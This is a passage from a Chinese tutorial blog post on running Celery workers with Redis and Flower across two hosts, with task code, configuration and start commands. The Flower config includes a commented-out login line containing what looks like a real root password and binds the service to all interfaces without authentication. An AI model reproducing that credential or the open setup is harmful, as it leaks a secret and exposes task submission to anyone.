系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。<br><strong>Celery**</strong>的架构**<br>Celery的架构由三部分组成，消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（task result store）组成。<br><strong>消息中间件</strong><br>Celery本身不提供消息服务，但是可以方便的和第三方提供的消息中间件集成，包括，<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>,<a href="http://mongodb.org/" target="_blank" rel="noopener">MongoDB</a>等，这里我先去了解<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>。<br><strong>任务执行单元</strong><br>Worker是Celery提供的任务执行的单元，worker并发的运行在分布式的系统节点中<br><strong>任务结果存储</strong><br>Task result store用来存储Worker执行的任务的结果，Celery支持以不同方式存储任务的结果，包括Redis，MongoDB，Django ORM，AMQP等，这里我先不去看它是如何存储的，就先选用Redis来存储任务执行结果。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p> 环境</p><ul><li>kaillinux  主机两台（192.168.29.234，192.168.29.198）</li><li>redis   (192.168.29.234 )</li><li>flower (192.168.29.234)</li><li>任务脚本（两台都必须部署）</li></ul><p>任务脚本</p><ul><li>tasks.py  (计算加减乘除)</li></ul><pre><code>import osimport sysimport datetimeBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))sys.path.append(BASE_DIR)from celery import Celeryfrom celery import chain, group, chord, Taskimport celeryconfigapp = Celery()app.config_from_object(celeryconfig)__all__ = [&#39;add&#39;, &#39;reduce&#39;,&#39;sum_all&#39;, &#39;other&#39;]##################################### tas #####################################@app.taskdef add(x, y):    return x + y@app.taskdef reduce(x, y):    return x - y@app.taskdef sum(values):    return sum([int(value) for value in values])@app.taskdef other(x, y):    return x * y</code></pre><ul><li>celeryconfig.py</li></ul><pre><code>!/usr/bin/python#coding:utf-8from kombu import QueueCELERY_TIMEZONE = &#39;Asia/Shanghai&#39;##################################### 一般配置 #####################################CELERY_TASK_SERIALIZER = &#39;json&#39;CELERY_RESULT_SERIALIZER = &#39;json&#39;CELERY_ACCEPT_CONTENT=[&#39;json&#39;]CELERY_TIMEZONE = &#39;Asia/Shanghai&#39;CELERY_ENABLE_UTC = True# List of modules to import when celery starts.CELERY_IMPORTS = (&#39;tasks&#39;, )CELERYD_MAX_TASKS_PER_CHILD = 40 #  每个worker执行了多少任务就会死掉BROKER_POOL_LIMIT = 10 #默认celery与broker连接池连接数CELERY_DEFAULT_QUEUE=&#39;default&#39;CELERY_DEFAULT_ROUTING_KEY=&#39;task.default&#39;CELERY_RESULT_BACKEND=&#39;redis://192.168.29.234:6379/0&#39;  BROKER_URL=&#39;redis://192.168.29.234:6379/0&#39;  #默认队列CELERY_DEFAULT_QUEUE = &#39;celery&#39;CELERY_DEFAULT_ROUTING_KEY = &#39;celery&#39;CELERYD_LOG_FILE=&quot;./logs/celery.log&quot;CELERY_QUEUEs = (    Queue(&quot;queue_add&quot;, routing_key=&#39;queue_add&#39;),    Queue(&#39;queue_reduce&#39;, routing_key=&#39;queue_sum&#39;),    Queue(&#39;celery&#39;, routing_key=&#39;celery&#39;),    )CELERY_ROUTES = {    &#39;task.add&#39;:{&#39;queue&#39;:&#39;queue_add&#39;, &#39;routing_key&#39;:&#39;queue_add&#39;},    &#39;task.reduce&#39;:{&#39;queue&#39;:&#39;queue_reduce&#39;, &#39;routing_key&#39;:&#39;queue_sum&#39;},}</code></pre><h1 id="关于flower是监控任务信息的web-图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower-文件"><a href="#关于flower是监控任务信息的web-图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower-文件" class="headerlink" title="关于flower是监控任务信息的web 图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower 文件"></a>关于flower是监控任务信息的web 图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower 文件</h1><p><a href="https://github.com/mher/flower" target="_blank" rel="noopener">flower github</a></p><p>在234 上flower.py 的脚本</p><pre><code>#!/usr/bin/env python#coding:utf-8broker_api = &#39;redis://127.0.0.1:6379/0&#39;logging = &#39;DEBUG&#39;address = &#39;0.0.0.0&#39;port = 5555#外部访问密码#basic_auth=[&#39;root:ybl8651073&#39;]persistent=True  #持久化celery tasks（如果为false的话，重启flower之后，监控的task就消失了)db=&quot;/root/flower_db&quot;</code></pre><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><ul><li>在198上启动<pre><code>celery worker -A  tasks --loglevel=info --queues=celery,queue_add --hostname=celery_worker198</code></pre></li><li>在234 上启动</li></ul><pre><code>1.  redis服务2.  celery worker -A  tasks --loglevel=info --queues=celery,queue_reduce --hostname=celery_worker2343.  celery  flower worker -A  tasks  --config==/root/flower.py </code></pre><h1 id="服务器验证"><a href="#服务器验证" class="headerlink" title="服务器验证"></a>服务器验证</h1><ul><li>在任一台有celeryservice项目代码的服务器上，运行add、reduce、-</li><li>sum、other任务（测试可简单使用add.delay(1,2)等）</li><li>add只会在198上运行，</li><li>sum任务，可能会在198或234服务器的worker节点运行</li><li>reduce任务,只会在234上运行。</li><li>other任务可能会在198或者234上运行。</li></ul><h1 id="打开监控web-192-168-29-234-5555"><a href="#打开监控web-192-168-29-234-5555" class="headerlink" title="打开监控web 192.168.29.234:5555"></a>打开监控web 192.168.29.234:5555</h1><p><img src="http://upload-images.jianshu.io/upload_images/3941016-3fb477a9ac403fba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=" 两台上线workers"></p><ul><li>随机运行几个任务</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/3941016-91d2a6b25d0eeba9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>分析<br><img src="http://upload-images.jianshu.io/upload_images/3941016-d8248fb57d9ac788.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="运行结果"></li></ul><ul><li>也可以通过 curl提交任务<pre><code>curl -X POST -d &#39;{&quot;args&quot;:[1,2]}&#39; http://192.168.29.234:5555/api/task/async-apply/tasks.add</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> django任务队列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
